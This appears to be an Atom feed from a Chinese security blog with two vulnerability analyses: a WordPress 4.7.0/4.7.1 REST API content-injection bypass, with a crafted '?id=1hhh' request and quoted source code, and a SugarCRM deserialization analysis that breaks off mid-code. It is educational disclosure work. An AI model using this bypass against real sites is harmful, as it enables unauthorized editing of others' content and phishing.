<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lucifaer&#39;s blog</title>
  
  <subtitle>Infomation Security Note</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://lucifaer.com/"/>
  <updated>2018-08-08T16:22:59.255Z</updated>
  <id>https://lucifaer.com/</id>
  
  <author>
    <name>Lucifaer</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>WordPress REST API 内容注入</title>
    <link href="https://lucifaer.com/2017/02/06/WordPress%20REST%20API%20%E5%86%85%E5%AE%B9%E6%B3%A8%E5%85%A5/"/>
    <id>https://lucifaer.com/2017/02/06/WordPress REST API 内容注入/</id>
    <published>2017-02-06T10:44:09.000Z</published>
    <updated>2018-08-08T16:22:59.255Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-漏洞简述"><a href="#0x00-漏洞简述" class="headerlink" title="0x00 漏洞简述"></a>0x00 漏洞简述</h1><h2 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1. 漏洞简介"></a>1. 漏洞简介</h2><p>在<code>REST API</code>自动包含在<code>Wordpress4.7</code>以上的版本，<code>WordPress REST API</code>提供了一组易于使用的HTTP端点，可以使用户以简单的JSON格式访问网站的数据，包括用户，帖子，分类等。检索或更新数据与发送HTTP请求一样简单。上周，一个由<code>REST API</code>引起的影响<code>WorePress4.7.0</code>和<code>4.7.1</code>版本的漏洞被披露，该漏洞可以导致WordPress所有文章内容可以未经验证被查看，修改，删除，甚至创建新的文章，危害巨大。</p><h2 id="2-漏洞影响版本"><a href="#2-漏洞影响版本" class="headerlink" title="2. 漏洞影响版本"></a>2. 漏洞影响版本</h2><ul><li>WordPress4.7.0</li><li>WordPress4.7.1</li></ul><a id="more"></a><h1 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h1><p><a href="https://www.seebug.org/vuldb/ssvid-92637" target="_blank" rel="noopener">Seebug</a>上已经给出详细的复现过程，在复现过程中可以使用<a href="https://www.exploit-db.com/exploits/41223/" target="_blank" rel="noopener">已经放出的POC</a>来进行测试。</p><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>其实漏洞发现者已经给出了较为详细的<a href="https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html" target="_blank" rel="noopener">分析过程</a>，接下来说说自己在参考了上面的分析后的一点想法。</p><h2 id="WP-REST-API"><a href="#WP-REST-API" class="headerlink" title="WP REST API"></a>WP REST API</h2><p>首先来说一下<code>REST API</code>。</p><h3 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h3><p><code>WP-API</code>中采用了控制器概念，为表示自愿端点的类提供了标准模式，所有资源端点都扩展<code>WP_REST_Controller</code>来保证其实现通用方法。</p><h3 id="五种请求"><a href="#五种请求" class="headerlink" title="五种请求"></a>五种请求</h3><p>之后，<code>WP-API</code>还有这么几种请求（也可以想成是功能吧）：</p><ul><li>HEAD</li><li>GET</li><li>POST</li><li>PUT</li><li>DELETE</li></ul><p>以上表示HTTP客户端可能对资源执行的操作类型。</p><h3 id="HTTP客户端"><a href="#HTTP客户端" class="headerlink" title="HTTP客户端"></a>HTTP客户端</h3><p>WordPress本身在<code>WP_HTTP</code>类和相关函数中提供了一个HTTP客户端。用于从另一个访问一个WordPress站点。</p><h3 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h3><p>简单来说，就是文章，页面，评论等。</p><p><code>WP-API</code>允许HTTP客户端对资源执行CRUD操作（创建，读取，更新，删除，这边只展示和漏洞相关的部分）：</p><ul><li><p><code>GET /wp-json/wp/v2/posts</code>获取帖子的集合：</p><p>  <img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15045885475349.jpg" alt=""></p></li><li><p><code>GET /wp-json/wp/v2/posts/1</code>获取一个ID为1的单独的Post：</p><p>  <img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15045885751013.jpg" alt=""></p></li></ul><p>可以看到ID为1的文章标题为Hello World，包括文章的路由也有。</p><h3 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h3><p>路由是用于访问端点的“名称”，在URL中使用（在非法情况下可控，就像这个漏洞一样）。</p><p>例如，使用URL<code>http://example.com/wp-json/wp/v2/posts/123</code>:</p><ul><li>路由（route）是<code>wp/v2/posts/123</code>，不包括<code>wp-json</code>，因为<code>wp-json</code>是API本身的基本路径。</li><li>这个路由有三个端点：<ul><li>GET触发一个<code>get_item</code>方法，将post数据返回给客户端。</li><li>PUT触发一个<code>update_item</code>方法，使数据更新，并返回更新的发布数据。</li><li>DELETE触发<code>delete_item</code>方法，将现在删除的发布数据返回给客户端。</li></ul></li></ul><h2 id="静态追踪"><a href="#静态追踪" class="headerlink" title="静态追踪"></a>静态追踪</h2><p>知道了<code>WP-API</code>的路由信息以及其操作方式，可以根据其运行的思路来看一下具体实现的代码。</p><p>我们看一下<code>/wp-includes/rest-api/endpoints/class-wp-rest-post-controller.php</code>：</p><p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15045885995846.jpg" alt=""></p><p>根据上面的信息，我们可以知道这是注册controller对象的路由，实现路由中端点方法。</p><p>在这里，如果我们向<code>/wp-json/wp/v2/posts/1</code>发送请求，则ID参数将被设置为1：</p><p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15045886320123.jpg" alt=""></p><p>同时，注意一下这里：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">register_rest_route( <span class="keyword">$this</span>-&gt;namespace, <span class="string">'/'</span> . <span class="keyword">$this</span>-&gt;rest_base . <span class="string">'/(?P&lt;id&gt;[\d]+)'</span>, <span class="keyword">array</span>(</span><br><span class="line"><span class="keyword">array</span>(</span><br><span class="line"><span class="string">'methods'</span>             =&gt; WP_REST_Server::READABLE,</span><br><span class="line"><span class="string">'callback'</span>            =&gt; <span class="keyword">array</span>( <span class="keyword">$this</span>, <span class="string">'get_item'</span> ),</span><br><span class="line"><span class="string">'permission_callback'</span> =&gt; <span class="keyword">array</span>( <span class="keyword">$this</span>, <span class="string">'get_item_permissions_check'</span> ),</span><br><span class="line"><span class="string">'args'</span>                =&gt; $get_item_args,</span><br><span class="line">),</span><br><span class="line"><span class="keyword">array</span>(</span><br><span class="line"><span class="string">'methods'</span>             =&gt; WP_REST_Server::EDITABLE,</span><br><span class="line"><span class="string">'callback'</span>            =&gt; <span class="keyword">array</span>( <span class="keyword">$this</span>, <span class="string">'update_item'</span> ),</span><br><span class="line"><span class="string">'permission_callback'</span> =&gt; <span class="keyword">array</span>( <span class="keyword">$this</span>, <span class="string">'update_item_permissions_check'</span> ),</span><br><span class="line"><span class="string">'args'</span>                =&gt; <span class="keyword">$this</span>-&gt;get_endpoint_args_for_item_schema( WP_REST_Server::EDITABLE ),</span><br><span class="line">),</span><br><span class="line"><span class="keyword">array</span>(</span><br><span class="line"><span class="string">'methods'</span>             =&gt; WP_REST_Server::DELETABLE,</span><br><span class="line"><span class="string">'callback'</span>            =&gt; <span class="keyword">array</span>( <span class="keyword">$this</span>, <span class="string">'delete_item'</span> ),</span><br><span class="line"><span class="string">'permission_callback'</span> =&gt; <span class="keyword">array</span>( <span class="keyword">$this</span>, <span class="string">'delete_item_permissions_check'</span> ),</span><br><span class="line"><span class="string">'args'</span>                =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'force'</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'type'</span>        =&gt; <span class="string">'boolean'</span>,</span><br><span class="line"><span class="string">'default'</span>     =&gt; <span class="keyword">false</span>,</span><br><span class="line"><span class="string">'description'</span> =&gt; __( <span class="string">'Whether to bypass trash and force deletion.'</span> ),</span><br><span class="line">),</span><br><span class="line">),</span><br><span class="line">),</span><br><span class="line"><span class="string">'schema'</span> =&gt; <span class="keyword">array</span>( <span class="keyword">$this</span>, <span class="string">'get_public_item_schema'</span> ),</span><br><span class="line">) );</span><br></pre></td></tr></table></figure><p>可以看到在<code>register_rest_route</code>中对路由进行了正则限制：</p><p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15045886830428.jpg" alt=""></p><p>也就是防止攻击者恶意构造ID值，但是我们可以发现<code>$_GET</code>和<code>$_POST</code>值优先于路由正则表达式生成的值：</p><p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15045887045836.jpg" alt=""></p><p>这边没有找到ID为<code>123hh</code>的项目，所以返回<code>rest_invalid</code>。</p><p>现在我们可以忽略路由正则的限制，来传入我们自定义的ID。</p><p>接下来在审查各个端点方法中，找到了<code>update_item</code>这个方法，及其权限检查方法<code>update_item_permissions_check</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_item_permissions_check</span><span class="params">( $request )</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">$post = get_post( $request[<span class="string">'id'</span>] );</span><br><span class="line">$post_type = get_post_type_object( <span class="keyword">$this</span>-&gt;post_type );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $post &amp;&amp; ! <span class="keyword">$this</span>-&gt;check_update_permission( $post ) ) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> WP_Error( <span class="string">'rest_cannot_edit'</span>, __( <span class="string">'Sorry, you are not allowed to edit this post.'</span> ), <span class="keyword">array</span>( <span class="string">'status'</span> =&gt; rest_authorization_required_code() ) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( ! <span class="keyword">empty</span>( $request[<span class="string">'author'</span>] ) &amp;&amp; get_current_user_id() !== $request[<span class="string">'author'</span>] &amp;&amp; ! current_user_can( $post_type-&gt;cap-&gt;edit_others_posts ) ) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> WP_Error( <span class="string">'rest_cannot_edit_others'</span>, __( <span class="string">'Sorry, you are not allowed to update posts as this user.'</span> ), <span class="keyword">array</span>( <span class="string">'status'</span> =&gt; rest_authorization_required_code() ) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( ! <span class="keyword">empty</span>( $request[<span class="string">'sticky'</span>] ) &amp;&amp; ! current_user_can( $post_type-&gt;cap-&gt;edit_others_posts ) ) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> WP_Error( <span class="string">'rest_cannot_assign_sticky'</span>, __( <span class="string">'Sorry, you are not allowed to make posts sticky.'</span> ), <span class="keyword">array</span>( <span class="string">'status'</span> =&gt; rest_authorization_required_code() ) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( ! <span class="keyword">$this</span>-&gt;check_assign_terms_permission( $request ) ) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> WP_Error( <span class="string">'rest_cannot_assign_term'</span>, __( <span class="string">'Sorry, you are not allowed to assign the provided terms.'</span> ), <span class="keyword">array</span>( <span class="string">'status'</span> =&gt; rest_authorization_required_code() ) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，此函数通过检查文章是否实际存在，以及我们的用户是否有权限编辑这边文章来验证请求。但是当我们发送一个没有响应文章的ID时，就可以通过权限检查，并允许继续执行对<code>update_item</code>方法的请求。</p><p>具体到代码，就是让<code>$post</code>为空，就可以通过权限检查，接下来跟进<code>get_post</code>方法中看一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_post</span><span class="params">( $post = null, $output = OBJECT, $filter = <span class="string">'raw'</span> )</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">empty</span>( $post ) &amp;&amp; <span class="keyword">isset</span>( $GLOBALS[<span class="string">'post'</span>] ) )</span><br><span class="line">$post = $GLOBALS[<span class="string">'post'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $post <span class="keyword">instanceof</span> WP_Post ) &#123;</span><br><span class="line">$_post = $post;</span><br><span class="line">&#125; <span class="keyword">elseif</span> ( is_object( $post ) ) &#123;</span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">empty</span>( $post-&gt;filter ) ) &#123;</span><br><span class="line">$_post = sanitize_post( $post, <span class="string">'raw'</span> );</span><br><span class="line">$_post = <span class="keyword">new</span> WP_Post( $_post );</span><br><span class="line">&#125; <span class="keyword">elseif</span> ( <span class="string">'raw'</span> == $post-&gt;filter ) &#123;</span><br><span class="line">$_post = <span class="keyword">new</span> WP_Post( $post );</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$_post = WP_Post::get_instance( $post-&gt;ID );</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$_post = WP_Post::get_instance( $post );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( ! $_post )</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure><p>从代码中可以看出，它是用<code>wp_posts</code>中的<code>get_instance</code>静态方法来获取文章的，跟进<code>wp_posts</code>类，位于<code>/wp-includes/class-wp-post.php</code>中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_instance</span><span class="params">( $post_id )</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $wpdb;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( ! is_numeric( $post_id ) || $post_id != floor( $post_id ) || ! $post_id ) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，当我们传入的ID不是全由数字字符组成的时候，就会返回false，也就是返回一个不存在的文章。从而<code>get_post</code>方法返回null，从而绕过<code>update_item_permissions_check</code>的权限检测。</p><p>回头再看一下可执行方法<code>upload_item</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_item</span><span class="params">( $request )</span> </span>&#123;</span><br><span class="line">$id   = (int) $request[<span class="string">'id'</span>];</span><br><span class="line">$post = get_post( $id );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">empty</span>( $id ) || <span class="keyword">empty</span>( $post-&gt;ID ) || <span class="keyword">$this</span>-&gt;post_type !== $post-&gt;post_type ) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> WP_Error( <span class="string">'rest_post_invalid_id'</span>, __( <span class="string">'Invalid post ID.'</span> ), <span class="keyword">array</span>( <span class="string">'status'</span> =&gt; <span class="number">404</span> ) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$post = <span class="keyword">$this</span>-&gt;prepare_item_for_database( $request );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( is_wp_error( $post ) ) &#123;</span><br><span class="line"><span class="keyword">return</span> $post;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// convert the post object to an array, otherwise wp_update_post will expect non-escaped input.</span></span><br><span class="line">$post_id = wp_update_post( wp_slash( (<span class="keyword">array</span>) $post ), <span class="keyword">true</span> );</span><br></pre></td></tr></table></figure><p>在这边将ID参数装换为一个整数，然后传递给<code>get_post</code>。而PHP类型转换的时候回出现这样的情况：</p><p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15045887374640.jpg" alt=""></p><p>所以，也就是说，当攻击者发起<code>/wp-json/wp/v2/posts/1?id=1hhh</code>请求时，便是发起了对ID为1的文章的请求。下面为利用<a href="https://www.exploit-db.com/exploits/41223/" target="_blank" rel="noopener">exploit-db</a>上的POC来进行测试：</p><ul><li><p>新建文章：</p><p>  <img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15045887686508.jpg" alt=""></p></li><li><p>测试：</p><p>  <img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15045887924832.jpg" alt=""></p></li><li><p>测试结果：</p><p>  <img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15045888358058.jpg" alt=""></p></li></ul><h2 id="多想了一下"><a href="#多想了一下" class="headerlink" title="多想了一下"></a>多想了一下</h2><p>乍一看，感觉这个洞并没有什么太大的影响，但是仔细想了一下，危害还是很大的。先不说WordPress页面执行php代码的各种插件，还有相当一部分的WordPress文章可以调用短代码的方式来输出特定的内容，以及向日志中添加内容，这是一个思路。</p><p>另一个思路就是可以进行对原来文章中的指定超链接进行修改，从而进行钓鱼。</p><p>还有一个思路，就是利用WordPress文章中解析html以及JavaScript文件包含的做法，辅助其他方法，进行攻击。</p><h1 id="0x03-diff比较"><a href="#0x03-diff比较" class="headerlink" title="0x03 diff比较"></a>0x03 diff比较</h1><p>对于该漏洞，关键的修改在<code>/wp-includes/class-wp-post.php</code>中：</p><p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15045888551118.jpg" alt=""></p><p>更改了对于<code>$post_id</code>的参数的传入顺序和判断条件，防止了我们传入数字+字母这样的格式进行绕过。</p><h1 id="0x04-修补方案"><a href="#0x04-修补方案" class="headerlink" title="0x04 修补方案"></a>0x04 修补方案</h1><p>将WordPress更新到最新版本。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-漏洞简述&quot;&gt;&lt;a href=&quot;#0x00-漏洞简述&quot; class=&quot;headerlink&quot; title=&quot;0x00 漏洞简述&quot;&gt;&lt;/a&gt;0x00 漏洞简述&lt;/h1&gt;&lt;h2 id=&quot;1-漏洞简介&quot;&gt;&lt;a href=&quot;#1-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;1. 漏洞简介&quot;&gt;&lt;/a&gt;1. 漏洞简介&lt;/h2&gt;&lt;p&gt;在&lt;code&gt;REST API&lt;/code&gt;自动包含在&lt;code&gt;Wordpress4.7&lt;/code&gt;以上的版本，&lt;code&gt;WordPress REST API&lt;/code&gt;提供了一组易于使用的HTTP端点，可以使用户以简单的JSON格式访问网站的数据，包括用户，帖子，分类等。检索或更新数据与发送HTTP请求一样简单。上周，一个由&lt;code&gt;REST API&lt;/code&gt;引起的影响&lt;code&gt;WorePress4.7.0&lt;/code&gt;和&lt;code&gt;4.7.1&lt;/code&gt;版本的漏洞被披露，该漏洞可以导致WordPress所有文章内容可以未经验证被查看，修改，删除，甚至创建新的文章，危害巨大。&lt;/p&gt;
&lt;h2 id=&quot;2-漏洞影响版本&quot;&gt;&lt;a href=&quot;#2-漏洞影响版本&quot; class=&quot;headerlink&quot; title=&quot;2. 漏洞影响版本&quot;&gt;&lt;/a&gt;2. 漏洞影响版本&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;WordPress4.7.0&lt;/li&gt;
&lt;li&gt;WordPress4.7.1&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析</title>
    <link href="https://lucifaer.com/2017/01/18/SugarCRM%20v6.5.23%20PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://lucifaer.com/2017/01/18/SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析/</id>
    <published>2017-01-17T16:23:44.000Z</published>
    <updated>2018-08-08T16:26:06.490Z</updated>
    
    <content type="html"><![CDATA[<p>免费广告…..推荐使用<code>PHPSTORM+Xdebug</code>来分析漏洞，下面的过程都是利用<code>PHPSTORM</code>来分析的。</p><a id="more"></a><p>这个是个去年的洞，当时出了的时候就仔细看了一下<code>CVE-2016-7124</code>（后面的班级对抗赛还出了一个关于这个漏洞的题），但是没有仔细的分析过在<code>SugarCRM</code>中的触发过程，或许是当时有点忙吧，或许是自己从404回来后缺乏了及时分析漏洞的氛围，整天忙于较为鸡肋课业，导致昏昏沉沉的荒废了一个学期。寒假的时候突然想着把那些没有分析过的漏洞再分析一遍，算是弥补遗憾吧。</p><p>就像上面说的，这洞是去年九月份爆出来的，正规的分析文档可以看<a href="http://paper.seebug.org/39/" target="_blank" rel="noopener">由创宇小伙伴写的漏洞分析文档</a>。我下面写的是我个人对于这个漏洞的一点分析过程，主要是从漏洞挖掘和漏洞分析来看一下这个洞。</p><h1 id="0x00-漏洞概述"><a href="#0x00-漏洞概述" class="headerlink" title="0x00 漏洞概述"></a>0x00 漏洞概述</h1><h2 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1. 漏洞简介"></a>1. 漏洞简介</h2><p>SugarCRM是一套开源的客户关系管理系统。在<code>&lt;6.5.23</code>版本中存在反序列化漏洞，攻击者可以通过构造恶意序列化数据，达到任意代码执行的目的。</p><h2 id="2-漏洞影响版本"><a href="#2-漏洞影响版本" class="headerlink" title="2. 漏洞影响版本"></a>2. 漏洞影响版本</h2><p>SugarCRM &lt;= 6.5.23<br>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10</p><h1 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h1><p><a href="http://paper.seebug.org/39/" target="_blank" rel="noopener">Dockerfile</a>看小伙伴的吧，拖到<code>phpstudy</code>里也行= =。</p><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><h2 id="找到可控点"><a href="#找到可控点" class="headerlink" title="找到可控点"></a>找到可控点</h2><p>首先在<code>service/core/REST/SugarRestSerialize.php</code>中的<code>serve</code>函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">serve</span><span class="params">()</span></span>&#123;</span><br><span class="line">$GLOBALS[<span class="string">'log'</span>]-&gt;info(<span class="string">'Begin: SugarRestSerialize-&gt;serve'</span>);</span><br><span class="line">$data = !<span class="keyword">empty</span>($_REQUEST[<span class="string">'rest_data'</span>])? $_REQUEST[<span class="string">'rest_data'</span>]: <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_REQUEST[<span class="string">'method'</span>]) || !method_exists(<span class="keyword">$this</span>-&gt;implementation, $_REQUEST[<span class="string">'method'</span>]))&#123;</span><br><span class="line">$er = <span class="keyword">new</span> SoapError();</span><br><span class="line">$er-&gt;set_error(<span class="string">'invalid_call'</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;fault($er);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$method = $_REQUEST[<span class="string">'method'</span>];</span><br><span class="line">$data = sugar_unserialize(from_html($data));</span><br><span class="line"><span class="keyword">if</span>(!is_array($data))$data = <span class="keyword">array</span>($data);</span><br><span class="line">$GLOBALS[<span class="string">'log'</span>]-&gt;info(<span class="string">'End: SugarRestSerialize-&gt;serve'</span>);</span><br><span class="line"><span class="keyword">return</span> call_user_func_array(<span class="keyword">array</span>( <span class="keyword">$this</span>-&gt;implementation, $method),$data);</span><br><span class="line">&#125; <span class="comment">// else</span></span><br><span class="line">&#125; <span class="comment">// fn</span></span><br></pre></td></tr></table></figure><p>在<code>$data = !empty($_REQUEST[&#39;rest_data&#39;])? $_REQUEST[&#39;rest_data&#39;]: &#39;&#39;;</code>传入可控参数，代码写的很简单，在传入<code>sugar_unserialize</code>方法前，首先将传入参数传入<code>from_html</code>方法中，而这个方法是用来进行编码转换的，可以看一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">from_html</span><span class="params">($string, $encode=true)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!is_string($string) || !$encode) &#123;</span><br><span class="line">        <span class="keyword">return</span> $string;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> $toHTML;</span><br><span class="line">    <span class="keyword">static</span> $toHTML_values = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">static</span> $toHTML_keys = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">static</span> $cache = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($toHTML) &amp;&amp; is_array($toHTML) &amp;&amp; (!<span class="keyword">isset</span>($toHTML_values) || !<span class="keyword">empty</span>($GLOBALS[<span class="string">'from_html_cache_clear'</span>]))) &#123;</span><br><span class="line">        $toHTML_values = array_values($toHTML);</span><br><span class="line">        $toHTML_keys = array_keys($toHTML);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Bug 36261 - Decode &amp;amp; so we can handle double encoded entities</span></span><br><span class="line">$string = str_ireplace(<span class="string">"&amp;amp;"</span>, <span class="string">"&amp;"</span>, $string);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($cache[$string])) &#123;</span><br><span class="line">        $cache[$string] = str_ireplace($toHTML_values, $toHTML_keys, $string);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $cache[$string];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>小窍门，对于这样的方法，其实可以往上面翻一翻，看一看关于这个方法的注释….额，就是这样，直接过….</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Replaces specific HTML entity values with the true characters</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $string String to check/replace</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bool $encode Default true</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> 